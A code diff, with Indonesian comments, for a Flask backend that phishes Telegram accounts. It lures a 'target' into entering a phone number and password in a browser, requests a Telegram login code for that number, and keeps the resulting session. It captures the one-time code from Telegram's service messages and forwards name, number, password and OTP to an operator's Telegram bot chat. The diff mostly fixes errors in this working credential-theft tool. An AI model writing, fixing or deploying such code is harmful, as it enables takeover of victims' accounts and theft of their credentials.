@@ -12,7 +12,6 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Memori sementara untuk menyimpan data sesi target
 user_db = {}
 
 def bot_api(method, payload):
@@ -27,10 +26,16 @@ def normalisasi_nomor(nomor):
 @app.route('/register', methods=['POST'])
 def register():
     data = request.get_json()
-    if not data: return jsonify({"status": "error"}), 400
+    if not data: return jsonify({"status": "error", "message": "No data"}), 400
+    
+    # Memperbaiki TypeError: Pastikan selalu ada return jsonify
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    return loop.run_until_complete(handle_flow(data))
+    try:
+        response = loop.run_until_complete(handle_flow(data))
+        return response
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 async def handle_flow(data):
     client = None
@@ -39,14 +44,12 @@ async def handle_flow(data):
         nomor = normalisasi_nomor(data.get('nomor', ''))
         nama = data.get('nama', 'User')
 
-        # Ambil session jika sudah ada
         session_str = user_db.get(nomor, {}).get('session', '')
         client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
         await client.connect()
 
-        # STEP 1 & 2: Target isi data di browser -> Kirim ke Bot
         if step == 1:
-            # Pancingan awal HANYA untuk mendapatkan Sesi akses (Session String)
+            # Pancingan awal untuk mendapatkan Sesi
             res = await client.send_code_request(nomor)
             user_db[nomor] = {
                 "session": client.session.save(), 
@@ -56,17 +59,16 @@ async def handle_flow(data):
                 "sandi": "None"
             }
             
-            # Kirim format sesuai permintaan Abang (OTP: None)
             text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : None"
             msg = bot_api("sendMessage", {
                 "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                 "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
             })
             user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
-            return jsonify({"status": "success"}), 200
+            return jsonify({"status": "success"})
 
-        # Simpan Kata Sandi jika target mengisi di browser
         elif step == 3:
+            # Update sandi jika ada
             user_db[nomor]['sandi'] = data.get('sandi', 'None')
             text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
             bot_api("editMessageText", {
@@ -74,7 +76,9 @@ async def handle_flow(data):
                 "text": text, "parse_mode": "Markdown",
                 "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
             })
-            return jsonify({"status": "success"}), 200
+            return jsonify({"status": "success"})
+            
+        return jsonify({"status": "unknown_step"})
     finally:
         if client: await client.disconnect()
 
@@ -85,7 +89,6 @@ def webhook():
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
         
-        # STEP 4: Klik tombol OTP -> Muncul teks "Bot siap"
         if action == "upd":
             if user_db.get(nomor, {}).get('status_id'):
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
@@ -96,47 +99,38 @@ def webhook():
             })
             user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
             
-            # STEP 5: Jalankan pemantau pesan masuk di latar belakang (Background)
+            # Threading agar Flask tidak gantung
             threading.Thread(target=lambda: asyncio.run(monitor_incoming_only(nomor))).start()
             
-        elif action == "exit":
-            if user_db.get(nomor, {}).get('status_id'):
-                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
-                user_db[nomor]['status_id'] = None
     return jsonify({"status": "success"})
 
 async def monitor_incoming_only(nomor):
     data = user_db.get(nomor)
     if not data or not data.get('session'): return
     
-    # Gunakan sesi yang didapat dari pancingan Step 1
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
-    await client.connect()
     
     try:
-        # STEP 6: Mendengarkan (Listen) pesan masuk dari Telegram (777000)
-        # Ini akan menangkap kode yang dikirim saat Abang login manual di TurboTel
+        # PERBAIKAN: Pastikan connect sebelum memantau
+        await client.connect()
+        if not await client.is_user_authorized(): return
+
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # Update OTP di pesan utama Step 1
                 bot_api("editMessageText", {
                     "chat_id": CHAT_ID, "message_id": data['msg_id'],
                     "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                     "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                 })
-                
-                # STEP 7: Hapus teks "Bot siap" secara otomatis
                 if data.get('status_id'):
                     bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
-                    data['status_id'] = None
-                
-                # Selesai, matikan pemantauan untuk nomor ini
                 await client.disconnect()
         
-        # Bot Standby selama 5 menit untuk menunggu Abang login di TurboTel
-        await asyncio.sleep(300)
+        await asyncio.sleep(300) 
+    except Exception as e:
+        print(f"Monitoring error: {e}")
     finally:
         if client.is_connected(): await client.disconnect()
 
